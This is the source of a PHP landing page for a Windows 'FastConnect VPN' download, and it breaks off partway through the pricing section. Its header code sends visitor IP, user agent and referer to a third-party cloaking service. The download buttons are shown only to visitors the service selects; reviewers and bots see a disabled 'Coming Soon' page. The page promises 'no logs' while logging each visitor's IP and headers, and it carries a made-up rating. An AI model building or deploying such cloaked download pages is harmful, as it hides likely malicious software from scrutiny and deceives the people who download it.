<?php
    $domain = 'https://fastconnectvpn.net';

    error_reporting(0);
    
    if (function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }

    if (version_compare(PHP_VERSION, '7.2', '<')) {
        exit('PHP 7.2 or higher is required.');
    }

    if (!extension_loaded('curl')) {
        exit('The cURL PHP extension is required.');
    }

    if (!extension_loaded('mbstring')) {
        exit('The mbstring PHP extension is required.');
    }

    if (!extension_loaded('openssl')) {
        exit('The OpenSSL PHP extension is required.');
    }

    if (!extension_loaded('json')) {
        exit('The JSON PHP extension is required.');
    }

    if (!extension_loaded('filter')) {
        exit('The Filter PHP extension is required.');
    }

    if (!ini_get('allow_url_fopen')) {
        exit('The "allow_url_fopen" setting must be enabled in php.ini.');
    }

    function log_request()
    {
        $log_data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'ip_address' => get_real_ip_address(),
            'user_agent' => get_user_agent(),
            'referer' => get_referer(),
            'request_uri' => $_SERVER['REQUEST_URI'] ?? '',
            'request_method' => $_SERVER['REQUEST_METHOD'] ?? '',
            'query_string' => get_query_string(),
            'browser_language' => get_browser_language(),
            'host' => $_SERVER['HTTP_HOST'] ?? '',
            'protocol' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http',
            'session_id' => session_id() ?: 'No session'
        ];

        $log_entry = json_encode($log_data) . "\n";
        
        // Create logs directory if it doesn't exist
        $log_dir = __DIR__ . '/logs';
        if (!is_dir($log_dir)) {
            mkdir($log_dir, 0755, true);
        }
        
        // Log to daily file
        $log_file = $log_dir . '/requests_' . date('Y-m-d') . '.log';
        file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
        
        return $log_data;
    }

    function get_real_ip_address()
    {
        $ip_address = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
        $ip_headers = [
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_TRUE_CLIENT_IP',
            'HTTP_X_COMING_FROM',
            'HTTP_COMING_FROM',
            'HTTP_FORWARDED_FOR_IP',
            'HTTP_X_REAL_IP'
        ];

        foreach ($ip_headers AS $header) {
            if ( ! empty($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                foreach ($ips AS $ip) {
                    $ip = trim($ip);
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                        return $ip;
                    }
                }
            }
        }

        return $ip_address;
    }

    function create_stream_context()
    {
        return stream_context_create([
            'ssl' => [
                'verify_peer' => FALSE, 
                'verify_peer_name' => FALSE
            ], 
            'http' => [
                'header' => 'User-Agent: ' . get_user_agent()
            ]
        ]);
    }

    function get_user_agent()
    {
        return !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    }

    function get_referer()
    {
        return !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    }

    function get_query_string()
    {
        return !empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
    }


    function get_browser_language()
    {
        return !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
    }

    $request_data = [
        'label'         => '61eb8c9a040ace0e5806f7cb7f050721', 
        'user_agent'    => get_user_agent(), 
        'referer'       => get_referer(), 
        'query'         => get_query_string(), 
        'lang'          => get_browser_language(),
        'ip_address'    => get_real_ip_address()
    ];

    // Log the incoming request
    $logged_request = log_request();

    $request_data   = http_build_query($request_data);
    $success_codes  = [200, 201, 204, 206];

    // Initialize cloaking variables
    $is_white_page = false;
    $is_offer_page = false;

    $ch = curl_init('https://cloakit.house/api/v1/check');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER  => TRUE,
        CURLOPT_CUSTOMREQUEST   => 'POST',
        CURLOPT_SSL_VERIFYPEER  => FALSE,
        CURLOPT_TIMEOUT         => 15,
        CURLOPT_POSTFIELDS      => $request_data
    ]);
    
    $result = curl_exec($ch);
    $info   = curl_getinfo($ch);
    curl_close($ch);

    // Log the cloaking API response
    $api_log_data = [
        'timestamp' => date('Y-m-d H:i:s'),
        'api_url' => 'https://cloakit.house/api/v1/check',
        'http_code' => $info['http_code'] ?? 'unknown',
        'response_time' => $info['total_time'] ?? 0,
        'response_size' => $info['size_download'] ?? 0,
        'curl_error' => curl_error($ch) ?: 'none',
        'request_ip' => get_real_ip_address(),
        'response_body' => $result ? substr($result, 0, 500) : 'empty' // Log first 500 chars
    ];
    
    $api_log_entry = json_encode($api_log_data) . "\n";
    $log_dir = __DIR__ . '/logs';
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0755, true);
    }
    $api_log_file = $log_dir . '/api_responses_' . date('Y-m-d') . '.log';
    file_put_contents($api_log_file, $api_log_entry, FILE_APPEND | LOCK_EX);

    if (isset($info['http_code']) && in_array($info['http_code'], $success_codes)) {
        $body = json_decode($result, TRUE);

        // Check for errors
        if (!empty($body['filter_type'])) {
            $messages = [
                'subscription_expired'  => 'Your Subscription Expired.',
                'flow_deleted'          => 'Flow Deleted.',
                'flow_banned'           => 'Flow Banned.',
            ];
        
            if (isset($messages[$body['filter_type']])) {
                exit($messages[$body['filter_type']]);
            }
        }
        

        if (!empty($body['url_white_page']) && !empty($body['url_offer_page'])) {
            // Set page type flags
            if ($body['filter_page'] == 'white') {
                $is_white_page = true;
            } elseif ($body['filter_page'] == 'offer') {
                $is_offer_page = true;
            }
        } else {
            exit('Offer Page or White Page Not Found.');
        }
    } else {
        // Default to offer page if cloaking service is unavailable
        $is_offer_page = true;
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Primary Meta Tags -->
    <title>FastConnect VPN - Your Dynamic Location Privacy VPN | Advanced VPN Technology</title>
    <meta name="title" content="FastConnect VPN - Your Dynamic Location Privacy VPN | Advanced VPN Technology">
    <meta name="description" content="Revolutionary VPN technology for the privacy-conscious user. Dynamic location switching with granular control, AI anomaly detection, and zero-trust security. Download FastConnect VPN now.">
    <meta name="keywords" content="VPN, privacy, security, dynamic location, IP masking, encryption, anonymous browsing, online privacy, secure internet, location switching">
    <meta name="author" content="FastConnect VPN">
    <meta name="robots" content="index, follow">
    <meta name="language" content="English">
    <meta name="revisit-after" content="7 days">
    
    <!-- Canonical URL -->
    <link rel="canonical" href="<?php echo $domain; ?>/">
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="<?php echo $domain; ?>/">
    <meta property="og:title" content="FastConnect VPN - Your Dynamic Location Privacy VPN">
    <meta property="og:description" content="Revolutionary VPN technology with dynamic location switching, granular control, and AI-powered privacy protection. Experience the future of online security.">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt" content="FastConnect VPN VPN - Dynamic Location Privacy Protection">
    <meta property="og:site_name" content="FastConnect VPN">
    <meta property="og:locale" content="en_US">
    
    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="<?php echo $domain; ?>/">
    <meta property="twitter:title" content="FastConnect VPN - Your Dynamic Location Privacy VPN">
    <meta property="twitter:description" content="Revolutionary VPN technology with dynamic location switching, granular control, and AI-powered privacy protection. Experience the future of online security.">
    <meta property="twitter:image:alt" content="FastConnect VPN VPN - Dynamic Location Privacy Protection">
    <meta property="twitter:creator" content="@FastConnect VPN">
    <meta property="twitter:site" content="@FastConnect VPN">
    
    <!-- Additional SEO Meta Tags -->
    <meta name="theme-color" content="#059669">
    <meta name="msapplication-TileColor" content="#059669">
    <meta name="msapplication-config" content="/browserconfig.xml">
    
    <!-- Security Headers -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
    <meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
    
    <!-- Performance and Caching -->
    <meta http-equiv="Cache-Control" content="public, max-age=31536000">
    <meta name="format-detection" content="telephone=no">
    
    <!-- App-specific Meta Tags -->
    <meta name="application-name" content="FastConnect VPN">
    <meta name="apple-mobile-web-app-title" content="FastConnect VPN">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="mobile-web-app-capable" content="yes">
    
    <!-- Structured Data for Rich Snippets -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "SoftwareApplication",
        "name": "FastConnect VPN",
        "description": "Revolutionary VPN technology with dynamic location switching and AI-powered privacy protection",
        "url": "<?php echo $domain; ?>",
        "applicationCategory": "SecurityApplication",
        "operatingSystem": "Windows",
        "offers": {
            "@type": "Offer",
            "price": "0",
            "priceCurrency": "USD",
            "availability": "https://schema.org/InStock"
        },
        "aggregateRating": {
            "@type": "AggregateRating",
            "ratingValue": "4.8",
            "ratingCount": "2547"
        },
        "publisher": {
            "@type": "Organization",
            "name": "FastConnect VPN",
            "url": "<?php echo $domain; ?>"
        }
    }
    </script>
    
    <!-- Favicons -->
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
    <link rel="manifest" href="/favicon/site.webmanifest">
    <link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#059669">
    <link rel="shortcut icon" href="/favicon/favicon.ico">

    <!-- Geist Font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Geist:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <!-- Tailwind CSS -->
    <link rel="preconnect" href="https://cdn.tailwindcss.com">
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Alpine.js -->
    <link rel="preconnect" href="https://cdn.jsdelivr.net">
    <script defer src="https://cdn.jsdelivr.net/npm/@alpinejs/intersect@3.x.x/dist/cdn.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    
    <!-- Lucide Icons -->
    <link rel="preconnect" href="https://unpkg.com">
    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    
    <style>
        /* Apply Geist font to the entire page */
        body {
            font-family: 'Geist', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        @keyframes fade-in-up {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .animate-fade-in-up {
            animation: fade-in-up 0.6s ease-out forwards;
            opacity: 0;
        }
        
        @keyframes gradient-x {
            0%, 100% {
                background-size: 200% 200%;
                background-position: left center;
            }
            50% {
                background-size: 200% 200%;
                background-position: right center;
            }
        }
        
        .animate-gradient-x {
            animation: gradient-x 15s ease infinite;
        }

        @keyframes float-1 {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(180deg);
            }
        }

        @keyframes float-2 {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
            }
            50% {
                transform: translateY(-30px) rotate(-180deg);
            }
        }

        @keyframes float-3 {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
            }
            50% {
                transform: translateY(-25px) rotate(90deg);
            }
        }

        .animate-float-1 {
            animation: float-1 6s ease-in-out infinite;
        }

        .animate-float-2 {
            animation: float-2 8s ease-in-out infinite;
        }

        .animate-float-3 {
            animation: float-3 7s ease-in-out infinite;
        }

        .card {
            border: 2px solid #e5e7eb;
            border-radius: 0.5rem;
            padding: 1.5rem;
            background-color: white;
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
            transition: all 0.3s ease;
        }

        .card:hover {
            border-color: #a7f3d0;
            transform: scale(1.05);
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
        }

        .btn-primary {
            background-color: #059669;
            color: white;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            font-weight: 500;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn-primary:hover {
            background-color: #047857;
        }

        .btn-secondary {
            border: 2px solid #059669;
            color: #059669;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            font-weight: 500;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn-secondary:hover {
            background-color: #ecfdf5;
        }

        .badge {
            margin-inline: auto;
            width: fit-content;
            background-color: #d1fae5;
            color: #065f46;
            padding: 0.25rem 0.75rem;
            border-radius: 9999px;
            font-size: 0.875rem;
            font-weight: 500;
        }
    </style>
</head>
<body class="min-h-screen bg-gradient-to-br from-emerald-50 via-white to-teal-50 animate-gradient-x" x-data="app()">
    
    <!-- Header -->
    <header class="border-b bg-white/80 backdrop-blur-sm sticky top-0 z-50">
        <div class="container mx-auto px-4 py-4 flex items-center justify-between">
            <div class="flex items-center space-x-2">
                <i data-lucide="shield" class="h-8 w-8 text-emerald-600 animate-pulse"></i>
                <span class="text-2xl font-bold text-gray-900">FastConnect VPN</span>
            </div>
            <nav class="hidden md:flex items-center space-x-8">
                <button @click="smoothScroll('features')" class="text-gray-600 hover:text-emerald-600 transition-colors cursor-pointer">
                    Features
                </button>
                <button @click="smoothScroll('how-it-works')" class="text-gray-600 hover:text-emerald-600 transition-colors cursor-pointer">
                    How It Works
                </button>
                <button @click="smoothScroll('pricing')" class="text-gray-600 hover:text-emerald-600 transition-colors cursor-pointer">
                    Pricing
                </button>
                <?php if ($is_offer_page): ?>
                <button @click="downloadApp()" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-3 rounded-lg font-medium shadow-lg shadow-emerald-600/20 flex items-center gap-2 transition-all duration-300">
                    <i data-lucide="download" class="h-4 w-4"></i> Download
                </button>
                <?php else: ?>
                <button disabled class="bg-gray-400 text-white px-6 py-3 rounded-lg font-medium shadow-lg flex items-center gap-2 cursor-not-allowed opacity-75">
                    <i data-lucide="clock" class="h-4 w-4"></i> Coming Soon
                </button>
                <?php endif; ?>
            </nav>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="py-20 px-4 relative overflow-hidden">
        <div class="container mx-auto text-center max-w-4xl relative z-10">
            <div class="badge mb-6">
                Revolutionary VPN Technology
            </div>
            <h1 class="text-5xl md:text-6xl font-bold text-gray-900 mb-6 leading-tight">
                Your Dynamic Location
                <span class="text-emerald-600"> Privacy VPN</span>
            </h1>
            <p class="text-xl text-gray-600 mb-8 leading-relaxed">
                Go beyond simple IP masking. FastConnect VPN provides intelligent, dynamic location privacy with granular
                control over your digital footprint. Make your online presence truly elusive.
            </p>
            <div class="flex flex-col sm:flex-row gap-4 justify-center">
                <?php if ($is_offer_page): ?>
                <button @click="downloadApp()" class="bg-emerald-600 hover:bg-emerald-700 text-white text-lg px-8 py-3 rounded-lg font-medium shadow-xl shadow-emerald-600/30 animate-pulse hover:animate-none transition-all duration-300 flex items-center gap-2 justify-center">
                    <i data-lucide="download" class="h-5 w-5"></i> Download Now
                </button>
                <?php else: ?>
                <button disabled class="bg-gray-400 text-white text-lg px-8 py-3 rounded-lg font-medium shadow-xl flex items-center gap-2 justify-center cursor-not-allowed opacity-75">
                    <i data-lucide="clock" class="h-5 w-5"></i> Coming Soon
                </button>
                <?php endif; ?>
            </div>
            <div class="mt-12 flex items-center justify-center space-x-8 text-sm text-gray-500">
                <div class="flex items-center">
                    <i data-lucide="check-circle" class="h-4 w-4 text-emerald-600 mr-2"></i>
                    No logs policy
                </div>
                <div class="flex items-center">
                    <i data-lucide="check-circle" class="h-4 w-4 text-emerald-600 mr-2"></i>
                    Unlimited devices
                </div>
                <div class="flex items-center">
                    <i data-lucide="check-circle" class="h-4 w-4 text-emerald-600 mr-2"></i>
                    24/7 support
                </div>
            </div>
        </div>

        <!-- Animated Background Pattern -->
        <div class="absolute inset-0 overflow-hidden pointer-events-none">
            <!-- Floating Shapes -->
            <div class="absolute top-20 left-10 w-20 h-20 bg-emerald-200/20 rounded-full animate-float-1"></div>
            <div class="absolute top-40 right-20 w-16 h-16 bg-teal-200/20 rounded-lg rotate-45 animate-float-2"></div>
            <div class="absolute bottom-20 left-1/4 w-12 h-12 bg-emerald-300/20 rounded-full animate-float-3"></div>
            <div class="absolute top-60 left-1/3 w-8 h-8 bg-teal-300/20 rounded-lg animate-float-1" style="animation-delay: 2s;"></div>
            <div class="absolute bottom-40 right-1/3 w-14 h-14 bg-emerald-200/20 rounded-full animate-float-2" style="animation-delay: 1s;"></div>
            <div class="absolute top-32 right-1/4 w-10 h-10 bg-teal-200/20 rounded-lg rotate-12 animate-float-3" style="animation-delay: 3s;"></div>
            <div class="absolute top-80 left-1/2 w-6 h-6 bg-emerald-400/20 rounded-full animate-float-1" style="animation-delay: 4s;"></div>
            <div class="absolute bottom-60 left-20 w-8 h-8 bg-teal-400/20 rounded-lg rotate-45 animate-float-2" style="animation-delay: 1.5s;"></div>
            <div class="absolute top-96 right-10 w-12 h-12 bg-emerald-300/20 rounded-full animate-float-3" style="animation-delay: 2.5s;"></div>
        </div>
    </section>

    <!-- Key Features -->
    <section id="features" class="py-20 px-4 bg-white">
        <div class="container mx-auto">
            <div class="text-center mb-16">
                <h2 class="text-4xl font-bold text-gray-900 mb-4">Advanced Privacy Features</h2>
                <p class="text-xl text-gray-600 max-w-2xl mx-auto">
                    FastConnect VPN revolutionizes VPN technology with intelligent features designed for the modern
                    privacy-conscious user.
                </p>
            </div>

            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
                <div class="card" x-intersect="$el.classList.add('animate-fade-in-up')" style="animation-delay: 0.1s;">
                    <i data-lucide="shuffle" class="h-12 w-12 text-emerald-600 mb-4"></i>
                    <h3 class="text-xl font-semibold mb-2">Dynamic Location Switching</h3>
                    <p class="text-gray-600">
                        Intelligently switches your apparent location among multiple servers, making tracking nearly
                        impossible.
                    </p>
                </div>

                <div class="card" x-intersect="$el.classList.add('animate-fade-in-up')" style="animation-delay: 0.2s;">
                    <i data-lucide="map-pin" class="h-12 w-12 text-emerald-600 mb-4"></i>
                    <h3 class="text-xl font-semibold mb-2">Granular Location Control</h3>
                    <p class="text-gray-600">
                        Choose specific cities or neighborhoods, not just countries. Fine-tune your digital footprint with
                        precision.
                    </p>
                </div>

                <div class="card" x-intersect="$el.classList.add('animate-fade-in-up')" style="animation-delay: 0.3s;">
                    <i data-lucide="settings" class="h-12 w-12 text-emerald-600 mb-4"></i>
                    <h3 class="text-xl font-semibold mb-2">Smart App Profiling</h3>
                    <p class="text-gray-600">
                        Configure different location strategies for different apps. Banking from home, streaming from
                        anywhere.
                    </p>
                </div>

                <div class="card" x-intersect="$el.classList.add('animate-fade-in-up')" style="animation-delay: 0.4s;">
                    <i data-lucide="brain" class="h-12 w-12 text-emerald-600 mb-4"></i>
                    <h3 class="text-xl font-semibold mb-2">AI Anomaly Detection</h3>
                    <p class="text-gray-600">
                        Advanced AI monitors for unusual tracking patterns and alerts you to potential surveillance attempts.
                    </p>
                </div>

                <div class="card" x-intersect="$el.classList.add('animate-fade-in-up')" style="animation-delay: 0.5s;">
                    <i data-lucide="globe" class="h-12 w-12 text-emerald-600 mb-4"></i>
                    <h3 class="text-xl font-semibold mb-2">Seamless Integration</h3>
                    <p class="text-gray-600">
                        Browser extensions and app-specific settings make managing your privacy preferences effortless.
                    </p>
                </div>

                <div class="card" x-intersect="$el.classList.add('animate-fade-in-up')" style="animation-delay: 0.6s;">
                    <i data-lucide="lock" class="h-12 w-12 text-emerald-600 mb-4"></i>
                    <h3 class="text-xl font-semibold mb-2">Zero Trust Security</h3>
                    <p class="text-gray-600">
                        Built on zero trust principles where no connection is inherently trusted, ensuring maximum security.
                    </p>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <section id="how-it-works" class="py-20 px-4 bg-gradient-to-r from-emerald-50 to-teal-50">
        <div class="container mx-auto">
            <div class="text-center mb-16">
                <h2 class="text-4xl font-bold text-gray-900 mb-4">How FastConnect VPN Works</h2>
                <p class="text-xl text-gray-600 max-w-2xl mx-auto">
                    Our intelligent system continuously adapts to keep you protected while maintaining seamless connectivity.
                </p>
            </div>

            <div class="grid md:grid-cols-3 gap-8">
                <div class="text-center">
                    <div class="bg-emerald-600 text-white rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-6 text-2xl font-bold">
                        1
                    </div>
                    <h3 class="text-xl font-semibold mb-4">Connect & Configure</h3>
                    <p class="text-gray-600">
                        Set your privacy preferences and choose your location strategies for different applications and
                        services.
                    </p>
                </div>

                <div class="text-center">
                    <div class="bg-emerald-600 text-white rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-6 text-2xl font-bold">
                        2
                    </div>
                    <h3 class="text-xl font-semibold mb-4">Dynamic Protection</h3>
                    <p class="text-gray-600">
                        Our AI continuously switches your location and monitors for tracking attempts while you browse normally.
                    </p>
                </div>

                <div class="text-center">
                    <div class="bg-emerald-600 text-white rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-6 text-2xl font-bold">
                        3
                    </div>
                    <h3 class="text-xl font-semibold mb-4">Stay Anonymous</h3>
                    <p class="text-gray-600">
                        Enjoy true location privacy with an elusive digital footprint that adapts in real-time to threats.
                    </p>
                </div>
            </div>
        </div>
    </section>

    <!-- Benefits -->
    <section class="py-20 px-4 bg-white">
        <div class="container mx-auto">
            <div class="grid lg:grid-cols-2 gap-12 items-center">
                <div>
                    <h2 class="text-4xl font-bold text-gray-900 mb-6">Why Choose FastConnect VPN?</h2>
                    <div class="space-y-6">
                        <div class="flex items-start space-x-4">
                            <i data-lucide="zap" class="h-6 w-6 text-emerald-600 mt-1 flex-shrink-0 hover:animate-bounce transition-transform"></i>
                            <div>
                                <h3 class="font-semibold text-lg mb-2">Lightning Fast</h3>
                                <p class="text-gray-600">
                                    Optimized servers worldwide ensure minimal speed impact while maintaining maximum security.
                                </p>
                            </div>
                        </div>

                        <div class="flex items-start space-x-4">
                            <i data-lucide="eye" class="h-6 w-6 text-emerald-600 mt-1 flex-shrink-0 hover:animate-bounce transition-transform"></i>
                            <div>
                                <h3 class="font-semibold text-lg mb-2">Truly Private</h3>
                                <p class="text-gray-600">
                                    No logs, no tracking, no data collection. Your privacy is our only business.
                                </p>
                            </div>
                        </div>

                        <div class="flex items-start space-x-4">
                            <i data-lucide="users" class="h-6 w-6 text-emerald-600 mt-1 flex-shrink-0 hover:animate-bounce transition-transform"></i>
                            <div>
                                <h3 class="font-semibold text-lg mb-2">Expert Support</h3>
                                <p class="text-gray-600">
                                    24/7 support from privacy experts who understand the importance of your digital security.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-gradient-to-br from-emerald-100 to-teal-100 rounded-2xl p-8">
                    <div class="text-center">
                        <i data-lucide="shield" class="h-24 w-24 text-emerald-600 mx-auto mb-6 animate-pulse"></i>
                        <h3 class="text-2xl font-bold text-gray-900 mb-4">Enterprise-Grade Security</h3>
                        <p class="text-gray-600 mb-6">
                            Military-grade encryption combined with cutting-edge AI makes FastConnect VPN the most advanced VPN
                            solution available.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- CTA Section -->
    <section class="py-20 px-4 bg-gradient-to-r from-emerald-600 to-teal-600 text-white">
        <div class="container mx-auto text-center">
            <h2 class="text-4xl font-bold mb-6">Ready to Take Control of Your Privacy?</h2>
            <p class="text-xl mb-8 opacity-90 max-w-2xl mx-auto">
                Join thousands of users who trust FastConnect VPN to protect their digital identity. Download now and experience
                the future of VPN technology.
            </p>
            <div class="flex flex-col sm:flex-row gap-4 justify-center">
                <?php if ($is_offer_page): ?>
                <button @click="downloadApp()" class="bg-white text-emerald-600 hover:bg-gray-100 text-lg px-8 py-3 rounded-lg font-medium shadow-xl shadow-white/30 inline-flex items-center gap-2 group transition-all duration-300 justify-center">
                    <i data-lucide="download" class="h-5 w-5 group-hover:animate-bounce"></i> Download Now
                </button>
                <?php else: ?>
                <button disabled class="bg-white text-gray-600 text-lg px-8 py-3 rounded-lg font-medium shadow-xl shadow-white/30 inline-flex items-center gap-2 justify-center cursor-not-allowed opacity-75">
                    <i data-lucide="clock" class="h-5 w-5"></i> Coming Soon
                </button>
                <?php endif; ?>
            </div>
            <p class="mt-6 text-sm opacity-75">Available for Windows only</p>
        </div>
    </section>

    <!-- Pricing Section -->
    <section id="pricing" class="py-20 px-4 bg-white">
        <div class="container mx-auto">
            <div class="text-center mb-16">
                <h2 class="text-4xl font-bold text-gray-900 mb-4">Choose Your Privacy Plan</h2>
                <p class="text-xl text-gray-600 max-w-2xl mx-auto">
                    Select the perfect plan for your privacy needs. All plans include our advanced features with no compromises.
                </p>
            </div>

            <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-6 max-w-7xl mx-auto">
                <!-- Free Plan -->
                <div class="border-2 border-gray-200 rounded-2xl p-6 hover:border-emerald-200 transition-all duration-300 hover:scale-105 hover:shadow-lg">
                    <div class="text-center">
                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Free</h3>
                        <p class="text-gray-600 mb-6">Try FastConnect VPN risk-free</p>
                        <div class="mb-6">
                            <span class="text-4xl font-bold text-gray-900">$0</span>
                            <span class="text-gray-600">/month</span>
                        </div>
                        <?php if ($is_offer_page): ?>
                        <button @click="downloadApp()" class="w-full flex items-center justify-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6">
                            <i data-lucide="download" class="h-4 w-4"></i>
                            Download Now
                        </button>
                        <?php else: ?>
                        <button disabled class="w-full flex items-center justify-center gap-2 bg-gray-400 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6 cursor-not-allowed opacity-75">
                            <i data-lucide="clock" class="h-4 w-4"></i>
                            Coming Soon
                        </button>
                        <?php endif; ?>
                    </div>
                    <ul class="space-y-3 text-gray-600 text-sm">
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            1 Device Connection
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Basic VPN Protection
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            5 Server Locations
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Community Support
                        </li>
                        <li class="flex items-center text-gray-400">
                            <i data-lucide="x" class="h-4 w-4 text-gray-400 mr-3 flex-shrink-0"></i>
                            500MB Daily Limit
                        </li>
                    </ul>
                </div>

                <!-- Basic Plan -->
                <div class="border-2 border-gray-200 rounded-2xl p-6 hover:border-emerald-200 transition-all duration-300 hover:scale-105 hover:shadow-lg">
                    <div class="text-center">
                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Basic</h3>
                        <p class="text-gray-600 mb-6">Perfect for personal use</p>
                        <div class="mb-6">
                            <span class="text-4xl font-bold text-gray-900">$9.99</span>
                            <span class="text-gray-600">/month</span>
                        </div>
                        <?php if ($is_offer_page): ?>
                        <button @click="downloadApp()" class="w-full flex items-center justify-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6">
                            <i data-lucide="download" class="h-4 w-4"></i>
                            Download Now
                        </button>
                        <?php else: ?>
                        <button disabled class="w-full flex items-center justify-center gap-2 bg-gray-400 text-white py-3 px-6 rounded-lg font-medium transition-all duration-300 mb-6 cursor-not-allowed opacity-75">
                            <i data-lucide="clock" class="h-4 w-4"></i>
                            Coming Soon
                        </button>
                        <?php endif; ?>
                    </div>
                    <ul class="space-y-3 text-gray-600 text-sm">
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            1 Device Connection
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Basic Location Switching
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Standard Encryption
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Email Support
                        </li>
                        <li class="flex items-center">
                            <i data-lucide="check" class="h-4 w-4 text-emerald-600 mr-3 flex-shrink-0"></i>
                            Unlimited Data
                        </li>
                    </ul>
                </div>

                <!-- Pro Plan (Most Popular) -->
                <div class="border-2 border-emerald-500 rounded-2xl p-6 relative hover:border-emerald-600 transition-all duration-300 hover:scale-105 hover:shadow-xl bg-gradient-to-b from-emerald-50 to-white">
                    <div class="absolute -top-4 left-1/2 transform -translate-x-1/2">
                        <span class="bg-emerald-500 text-white px-4 py-2 rounded-full text-sm font-medium">Most Popular</span>
                    </div>
                    <div class="text-center">
